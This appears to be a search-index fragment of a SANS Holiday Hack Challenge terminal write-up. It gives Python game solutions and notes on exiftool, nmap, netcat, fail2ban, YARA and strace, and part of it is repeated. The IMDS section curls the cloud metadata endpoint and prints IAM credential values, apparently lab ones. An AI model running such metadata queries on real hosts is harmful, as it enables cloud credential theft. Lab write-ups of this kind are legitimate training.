object_list = [3,2,1,0] elf.moveLeft(2) lever4.pull(\"A String\") for elem in object_list: lollipop = lollipops.get(elem) lever = levers.get(elem) elf.moveUp(2) leverData = lever.data() lever.pull(leverData) elf.moveTo({\"x\":2,\"y\":2}) Level 5 Objective Pull all of the levers by submitting the requested data for each using lever.pull(data) to disable the Yeeter trap at the KringleCon entrance. Hint Move the elf to the lever. Get the lever data lever.data() and perform the appropriate action to the data. Submit the modified data using lever.pull(modified_data). import elf, munchkins, levers, lollipops, yeeters, pits lever0, lever1, lever2, lever3, lever4 = levers.get() elf.moveLeft(2) lever4.pull(\"undefined concatenate\") elf.moveUp(2) lever3.pull(True) elf.moveUp(2) x = lever2.data() lever2.pull(x+1) elf.moveUp(2) y = lever1.data() y.append(1) lever1.pull(y) elf.moveUp(2) z = lever0.data() z[\"strkey\"]= \"strvalue\" lever0.pull(z) elf.moveUp(2) Level 6 Objective Move the elf to the lever. Get the lever data lever.data() and perform the appropriate action to the data. Submit the modified data using lever.pull(modified_data). Hints This level requires the use of operators to compare and modify data. This link on operators should help. https://www.freecodecamp.org/news/the-python-guide-for-beginners/#operators Data types will also need to be checked using conditionals in if, elif, else statements. This link on conditionals should help. https://www.freecodecamp.org/news/the-python-guide-for-beginners/#operators You will also need to use conditionals to check data types. This link on types should help. https://www.freecodecamp.org/news/the-python-guide-for-beginners/#types For example, if you want to check the type of a variable, you could use: if type(var) == str: print(\"Its a string!\") Calling lever.data() will return a boolean, a number, a list of integers, a string, or a dict with \"a\" and an integer to you. For a boolean, return the inverse. For a number, return double the number. For a list of integers, return that list with each integer incremented by 1. For a string, return the string concatenated with itself. For a dict, return the dict with a's value + 1. Submit this response using lever.pull(conditional_answer) . Move elf to lever elf.moveUp(2) Get lever data leverData = lever.data() Perform action to data for boolean, return the inverse print(type(data)) for number, return double the number for list of integers, return list with each integer incremented by one for string return string concatenated with itself for dict return dict with a's value + 1 lever.pull(\"foo\") Submit modified data --> \"lever.pull(modified_data)\" Only handled for the first condition. Need to handle for all conditions listed * import elf, munchkins, levers, lollipops, yeeters, pits # Fix/Complete the below code lever = levers.get(0) data = lever.data() if type(data) == bool: data = not data elf.moveUp(2) lever.pull(data) elf.moveUp(2) elif type(data) == int: data = data * 2 elif type(data) == list: print(data) for i in range(len(data)): data[i] += 1 Level 7 Objective Navigate through the obstacles and collect the lollipop before arriving at the KringleCon entrance. Hints Using a for loop can reduce how many lines and/or object function calls are used. This link on for loops may be helpful. Using elf.moveLeft(40) will move your elf as far as possible before hitting an obstacle or the end of the screen. Use however large a number you think you need! import elf, munchkins, levers, lollipops, yeeters, pits elf.moveLeft(1) elf.moveUp(11) elf.moveLeft(2) elf.moveDown(11) elf.moveLeft(2) elf.moveUp(11) elf.moveLeft(2) elf.moveDown(11) elf.moveLeft(3) elf.moveUp(10) Level 8 Objective Navigate past the obstacles and avoid the munchkin watching the KringleCon entrance. Hints Reduce the number of lines necessary to reach the KringleCon entrance by using a loop. This link on for loops will be helpful. There are two paths for you to choose from. Choosing the lever takes more steps but may be easier to solve. import elf, munchkins, levers, lollipops, yeeters, pits all_lollipops = lollipops.get() for lollipop in all_lollipops: lollipop = lollipops.get(0) elf.moveTo(lollipop.position) lever = levers.get(0) elf.moveTo(lever.position) data = lever.data() data[:0] = [\"munchkins rule\"] lever.pull(data) elf.moveTo({\"x\":8,\"y\":4}) elf.moveTo({\"x\":2,\"y\":2}) Level 9 Objective Follow the swirl being careful not to step on any traps (or get yeeted off the map). Note: The elf.moveTo(object) function has been disabled for this challenge. Hint Use loops and an incrementing count to take the exact number of steps. Some sample code has been started for you but needs to be fixed/finished.","title":"Terminals"},{"location":"terminals/#terminals","text":"","title":"Terminals"},{"location":"terminals/#terminal-exifmetada","text":"(Talk to Piney Sappington) Grep the exiftool result of all files for 12-24 to find suspicious time stamps. Grep the exiftool result of all files for \"23:59\" and get the line right before it that shows the date the file was created, which is the file name in question. exiftool *.docx | grep 23:59 -B 1","title":"Terminal: ExifMetada"},{"location":"terminals/#terminal-grepping-for-gold","text":"(Talk to Greasy Gopherguts) Answer all the questions in the quizme executable: What port does 34.76.1.22 have open? cat bigscan.gnmap | grep 34.76.1.22 Answer: 62078 What port does 34.77.207.226 have open? cat bigscan.gnmap | grep 34.77.207.226 Answer: 8080 How many hosts appear \"Up\" in the scan? cat bigscan.gnmap | grep Up | wc -l Answer: 26054 How many hosts have a web port open? (Let's just use TCP ports 80, 443, and 8080) cat bigscan.gnmap | grep http | wc -l Answer: 14372 How many hosts with status Up have no (detected) open TCP ports? Subtract tcp from Up cat bigscan.gnmap | grep Up | wc -l cat bigscan.gnmap | grep tcp | wc -l Answer: 402 What's the greatest number of TCP ports any one host has open? cat bigscan.gnmap | awk '/80\\/open/ {print $17}' | grep open The 17th column shows the 12th open port and this is the last one that any host displays. Answer: 12","title":"Terminal: Grepping for Gold"},{"location":"terminals/#terminal-logic-munchers","text":"My son did this for me. He just went around as fast as he could with his mad gaming skills and grabbed every true thing he could find before the trolls got him.","title":"Terminal: Logic Munchers"},{"location":"terminals/#terminal-ipv6-sandbox","text":"Use hints from this Gist: https://gist.github.com/chriselgee/c1c69756e527f649d0a95b6f20337c2f We need to find the machine where the password is located. Look for addresses in your subnet: ping6 ff02::1 -c2 fe80::42:57ff:fe11:b28%eth0 fe80::42:c0ff:fea8:a002%eth0 Run nmap to see what ports they have open: nmap -6 fe80::42:57ff:fe11:b28%eth0 22/tcp, 3000/tcp nmap -6 fe80::42:c0ff:fea8:a002%eth0 80/tcp, 9000/tcp [ Hit the cslistener service with netcat: nc -6 fe80::42:c0ff:fea8:a002%eth0 9000 password: PieceOnEarth","title":"Terminal: IPv6 Sandbox"},{"location":"terminals/#terminal-santas-holiday-hero","text":"Chimney Scissorsticks in Netwars Area My son came in and told me to do the following: Don't spam the controls Don't keep hitting after notes after they've passed \"Dad, you're lucky you got a good partner.\" (Apparently I'm not very good at this.)","title":"Terminal: Santa's Holiday Hero"},{"location":"terminals/#terminal-frostavator","text":"TO DO: Complete the explanation of this terminal challenge. Figure out how to explain with respect to Frostavator. This is an XOR gate challenge. Some notes:","title":"Terminal: Frostavator"},{"location":"terminals/#terminal-ho-ho-no","text":"echo \"[custom_jail] enabled = true logpath = /var/log/hohono.log findtime = 60m maxretry = 10 bantime = 30m filter = custom_filter action = custom_action \" > /etc/fail2ban/jail.d/custom_jail.conf echo \"[Definition] actionban = /root/naughtylist add <ip> actionunban = /root/naughtylist del <ip> \" > /etc/fail2ban/action.d/custom_action.conf echo \"[Definition] failregex = [Ll]ogin from <HOST> rejected [Ff]ailed login from <HOST> for [Ii]nvalid heartbeat\\s'([^']*)'\\sfrom\\s<HOST> <HOST> sent a malformed request \" > /etc/fail2ban/filter.d/custom_filter.conf cat /etc/fail2ban/jail.d/custom_jail.conf cat /etc/fail2ban/filter.d/custom_filter.conf cat /etc/fail2ban/action.d/custom_action.conf fail2ban-regex /var/log/hohono.log /etc/fail2ban/filter.d/custom_filter.conf service fail2ban restart /root/naughtylist refresh","title":"Terminal: Ho Ho ... No"},{"location":"terminals/#terminal-yara-analysis","text":"cat ./yara_rules/rules.yar cat ./yara_rules/rules.yar | grep 'yara_rule_135 {' -A 10 meta: description = \"binaries - file Sugar_in_the_machinery\" author = \"Sparkle Redberry\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-21\" hash = \"19ecaadb2159b566c39c999b0f860b4d8fc2824eb648e275f57a6dbceaf9b488\" strings: $s = \"candycane\" condition: $s ``` **cat ./yara_rules/rules.yar | grep 'yara_rule_1056 {' -A 10 ** rule yara_rule_1056 { meta: description = \"binaries - file frosty.exe\" author = \"Sparkle Redberry\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-21\" hash = \"b9b95f671e3d54318b3fd4db1ba3b813325fcef462070da163193d7acb5fcd03\" strings: $s1 = {6c 6962 632e 736f 2e36} $hs2 = {726f 6772 616d 2121} condition: all of them } **cat ./yara_rules/rules.yar | grep 'yara_rule_1732 {' -A 10 ** ``` rule yara_rule_1732 { meta: description = \"binaries - alwayz_winter.exe\" author = \"Santa\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-22\" hash = \"c1e31a539898aab18f483d9e7b3c698ea45799e78bddc919a7dbebb1b40193a8\" strings: $s1 = \"This is critical for the execution of this program!!\" fullword ascii $s2 = \"__frame_dummy_init_array_entry\" fullword ascii $s3 = \".note.gnu.property\" fullword ascii $s4 = \".eh_frame_hdr\" fullword ascii $s5 = \"__FRAME_END__\" fullword ascii $s6 = \"__GNU_EH_FRAME_HDR\" fullword ascii $s7 = \"frame_dummy\" fullword ascii $s8 = \".note.gnu.build-id\" fullword ascii $s9 = \"completed.8060\" fullword ascii $s10 = \"_IO_stdin_used\" fullword ascii $s11 = \".note.ABI-tag\" fullword ascii $s12 = \"naughty string\" fullword ascii $s13 = \"dastardly string\" fullword ascii $s14 = \"__do_global_dtors_aux_fini_array_entry\" fullword ascii $s15 = \"__libc_start_main@@GLIBC_2.2.5\" fullword ascii $s16 = \"GLIBC_2.2.5\" fullword ascii $s17 = \"its_a_holly_jolly_variable\" fullword ascii $s18 = \"__cxa_finalize\" fullword ascii $s19 = \"HolidayHackChallenge{NotReallyAFlag}\" fullword ascii $s20 = \"__libc_csu_init\" fullword ascii condition: uint32(1) == 0x02464c45 and filesize < 50KB and 10 of them truncate -s +100000 the_critical_elf_app ./the_critical_elf_app ./the_critical_elf_app: error while loading shared libraries: libc/so.6: cannot open shared object file: No such file or directory Machine Running.. Toy Levels: Very Merry, Terry Naughty/Nice Blockchain Assessment: Untampered Candy Sweetness Gauge: Exceedingly Sugarlicious Elf Jolliness Quotient: 4a6f6c6c7920456e6f7567682c204f76657274696d6520417070726f766564","title":"Terminal: Yara Analysis"},{"location":"terminals/#terminal-imds-exploration","text":"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-role curl http://169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-role { \"Code\": \"Success\", \"LastUpdated\": \"2021-12-02T18:50:40Z\", \"Type\": \"AWS-HMAC\", \"AccessKeyId\": \"AKIA5HMBSK1SYXYTOXX6\", \"SecretAccessKey\": \"CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX\", \"Token\": \"NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==\", \"Expiration\": \"2026-12-02T18:50:40Z\" curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/placement/region","title":"Terminal: IMDS Exploration"},{"location":"terminals/#terminal-strace-ltrace-retrace","text":"ltrace ./make_the_candy fopen(\"registration.json\", \"r\") = 0 puts(\"Unable to open configuration fil\"...Unable to open configuration file. ) = 35 +++ exited (status 1) +++ strace ./make_the_candy execve(\"./make_the_candy\", [\"./make_the_candy\"], 0x7fffb8ba06d0 /* 12 vars */) = 0 brk(NULL) = 0x55642b49e000 access(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory) access(\"/etc/ld.so.preload\", R_OK) = -1 ENOENT (No such file or directory) openat(AT_FDCWD, \"/etc/ld.so.cache\", O_RDONLY|O_CLOEXEC) = 3 fstat(3, {st_mode=S_IFREG|0644, st_size=19540, ...}) = 0 mmap(NULL, 19540, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcbb5834000 close(3) = 0 access(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory) openat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libc.so.6\", O_RDONLY|O_CLOEXEC) = 3 read(3, \"\\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0\\20\\35\\2\\0\\0\\0\\0\\0\"..., 832) = 832 fstat(3, {st_mode=S_IFREG|0755, st_size=2030928, ...}) = 0 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fcbb5832000 mmap(NULL, 4131552, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fcbb521f000 mprotect(0x7fcbb5406000, 2097152, PROT_NONE) = 0 mmap(0x7fcbb5606000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e7000) = 0x7fcbb5606000 mmap(0x7fcbb560c000, 15072, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fcbb560c000 close(3) = 0 arch_prctl(ARCH_SET_FS, 0x7fcbb58334c0) = 0 mprotect(0x7fcbb5606000, 16384, PROT_READ) = 0 mprotect(0x55642a814000, 4096, PROT_READ) = 0 mprotect(0x7fcbb5839000, 4096, PROT_READ) = 0 munmap(0x7fcbb5834000, 19540) = 0 brk(NULL) = 0x55642b49e000 brk(0x55642b4bf000) = 0x55642b4bf000 openat(AT_FDCWD, \"registration.json\", O_RDONLY) = 3 fstat(3, {st_mode=S_IFREG|0644, st_size=0, ...}) = 0 read(3, \"\", 4096) = 0 fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0 write(1, \"Unregistered - Exiting.\\n\", 24Unregistered - Exiting. ) = 24 exit_group(1) = ? +++ exited with 1 +++ ltrace ./make_the_candy fopen(\"registration.json\", \"r\") = 0x561d0a628260 getline(0x7ffc50e863d0, 0x7ffc50e863d8, 0x561d0a628260, 0x7ffc50e863d8) = 2 strstr(\"{\\n\", \"Registration\") = nil getline(0x7ffc50e863d0, 0x7ffc50e863d8, 0x561d0a628260, 0x7ffc50e863d8) = 20 strstr(\" name: CottonCandy\\n\", \"Registration\") = nil getline(0x7ffc50e863d0, 0x7ffc50e863d8, 0x561d0a628260, 0x7ffc50e863d8) = 2 strstr(\"}\\n\", \"Registration\") = nil getline(0x7ffc50e863d0, 0x7ffc50e863d8, 0x561d0a628260, 0x7ffc50e863d8) = -1 puts(\"Unregistered - Exiting.\"Unregistered - Exiting. ) = 24 +++ exited (status 1) +++ registration.json \"strstr\" shows what string the program is looking for \"strchr\" shows what character the program is looking for \"Registration:True\"","title":"Terminal: Strace Ltrace Retrace"},{"location":"terminals/#terminal-the-elf-c0de","text":"Most of the information you'll need is provided during the game, but I'll give you a few more pointers, if you want them. Not sure what a lever requires? Click it in the Current Level Objectives panel. You can move the elf with commands like elf.moveLeft(5), elf.moveTo({\"x\":2,\"y\":2}), or elf.moveTo(lever0.position). Looping through long movements? Don't be afraid to moveUp(99) or whatever. You elf will stop at any obstacle. You can call functions like myFunction(). If you ever need to pass a function to a munchkin, you can use myFunction without the (). import elf, munchkins, levers, lollipops, yeeters, pits # Grab our lever object lever = levers.get(0) munchkin = munchkins.get(0) lollipop = lollipops.get(0) # move to lever position elf.moveTo(lever.position) # get lever int and add 2 and submit val leverData = lever.data() + 2 lever.pull(leverData) # Grab lollipop and stand next to munchkin elf.moveLeft(1) elf.moveUp(8) # Solve the munchkin's challenge munchList = munchkin.ask() # e.g. [1, 3, \"a\", \"b\", 4] answer_list = [] for elem in munchList: if type(elem) == int: answer_list.append(elem) munchkin.answer(answer_list) elf.moveUp(2) # Move to finish Level 1 import elf, munchkins, levers, lollipops, yeeters, pits lollipop = lollipops.get(0) elf.moveTo(lollipop.position) elf.moveTo({\"x\":2,\"y\":2}) Level 2 import elf, munchkins, levers, lollipops, yeeters, pits #lollipop = lollipops.get(1) #elf.moveTo(lollipop.position) lollipop = lollipops.get(1) elf.moveTo(lollipop.position) lollipop = lollipops.get(0) elf.moveTo(lollipop.position) elf.moveTo({\"x\":2,\"y\":2}) Level 3 You can walk past the Yeeter once you complete lever0's task and lever0.pull(modified_data) in the desired way to disable to Yeeter trap. Click on the lever 0 object in the CURRENT LEVEL OBJECTS panel for more information. import elf, munchkins, levers, lollipops, yeeters, pits lever0 = levers.get(0) lollipop0 = lollipops.get(0) elf.moveTo(lever0.position) leverData = lever0.data()+2 lever0.pull(leverData) elf.moveTo(lollipop0.position) elf.moveTo({\"x\":2,\"y\":2}) Level 4 Objective Submit ANY string object to this lever using lever.pull(string_object) Note If you submit a correct answer to lever.pull(answer), then the lever and its corresponding trap will be disabled. In order to run lever.pull(answer) with lever (#4), you must be standing in its grid square located at (x:2,y:12). This particular lever object can be saved to a variable named lever using lever = levers.get(4) import elf, munchkins, levers, lollipops, yeeters, pits lever0, lever1, lever2, lever3, lever4 = levers.get() object_list = [3,2,1,0] elf.moveLeft(2) lever4.pull(\"A String\") for elem in object_list: lollipop = lollipops.get(elem) lever = levers.get(elem) elf.moveUp(2) leverData = lever.data() lever.pull(leverData) elf.moveTo({\"x\":2,\"y\":2}) Level 5 Objective Pull all of the levers by submitting the requested data for each using lever.pull(data) to disable the Yeeter trap at the KringleCon entrance. Hint Move the elf to the lever. Get the lever data lever.data() and perform the appropriate action to the data. Submit the modified data using lever.pull(modified_data). import elf, munchkins, levers, lollipops, yeeters, pits lever0, lever1, lever2, lever3, lever4 = levers.get() elf.moveLeft(2) lever4.pull(\"undefined concatenate\") elf.moveUp(2) lever3.pull(True) elf.moveUp(2) x = lever2.data() lever2.pull(x+1) elf.moveUp(2) y = lever1.data() y.append(1) lever1.pull(y) elf.moveUp(2) z = lever0.data() z[\"strkey\"]= \"strvalue\" lever0.pull(z) elf.moveUp(2) Level 6 Objective Move the elf to the lever. Get the lever data lever.data() and perform the appropriate action to the data. Submit the modified data using lever.pull(modified_data). Hints This level requires the use of operators to compare and modify data. This link on operators should help. https://www.freecodecamp.org/news/the-python-guide-for-beginners/#operators Data types will also need to be checked using conditionals in if, elif, else statements. This link on conditionals should help. https://www.freecodecamp.org/news/the-python-guide-for-beginners/#operators You will also need to use conditionals to check data types. This link on types should help. https://www.freecodecamp.org/news/the-python-guide-for-beginners/#types For example, if you want to check the type of a variable, you could use: if type(var) == str: print(\"Its a string!\") Calling lever.data() will return a boolean, a number, a list of integers, a string, or a dict with \"a\" and an integer to you. For a boolean, return the inverse. For a number, return double the number. For a list of integers, return that list with each integer incremented by 1. For a string, return the string concatenated with itself. For a dict, return the dict with a's value + 1. Submit this response using lever.pull(conditional_answer) . Move elf to lever elf.moveUp(2) Get lever data leverData = lever.data() Perform action to data for boolean, return the inverse print(type(data)) for number, return double the number for list of integers, return list with each integer incremented by one for string return string concatenated with itself for dict return dict with a's value + 1 lever.pull(\"foo\") Submit modified data --> \"lever.pull(modified_data)\" Only handled for the first condition. Need to handle for all conditions listed * import elf, munchkins, levers, lollipops, yeeters, pits # Fix/Complete the below code lever = levers.get(0) data = lever.data() if type(data) == bool: data = not data elf.moveUp(2) lever.pull(data) elf.moveUp(2) elif type(data) == int: data = data * 2 elif type(data) == list: print(data) for i in range(len(data)): data[i] += 1 Level 7 Objective Navigate through the obstacles and collect the lollipop before arriving at the KringleCon entrance. Hints Using a for loop can reduce how many lines and/or object function calls are used. This link on for loops may be helpful. Using elf.moveLeft(40) will move your elf as far as possible before hitting an obstacle or the end of the screen. Use however large a number you think you need! import elf, munchkins, levers, lollipops, yeeters, pits elf.moveLeft(1) elf.moveUp(11) elf.moveLeft(2) elf.moveDown(11) elf.moveLeft(2) elf.moveUp(11) elf.moveLeft(2) elf.moveDown(11) elf.moveLeft(3) elf.moveUp(10) Level 8 Objective Navigate past the obstacles and avoid the munchkin watching the KringleCon entrance. Hints Reduce the number of lines necessary to reach the KringleCon entrance by using a loop. This link on for loops will be helpful. There are two paths for you to choose from. Choosing the lever takes more steps but may be easier to solve. import elf, munchkins, levers, lollipops, yeeters, pits all_lollipops = lollipops.get() for lollipop in all_lollipops: lollipop = lollipops.get(0) elf.moveTo(lollipop.position) lever = levers.get(0) elf.moveTo(lever.position) data = lever.data() data[:0] = [\"munchkins rule\"] lever.pull(data) elf.moveTo({\"x\":8,\"y\":4}) elf.moveTo({\"x\":2,\"y\":2}) Level 9 Objective Follow the swirl being careful not to step on any traps (or get yeeted off the map). Note: The elf.moveTo(object) function has been disabled for this challenge. Hint Use loops and an incrementing count to take the exact number of steps. Some sample code has been started for you but needs to be fixed/finished.","title":"Terminal: The Elf C0de"}]}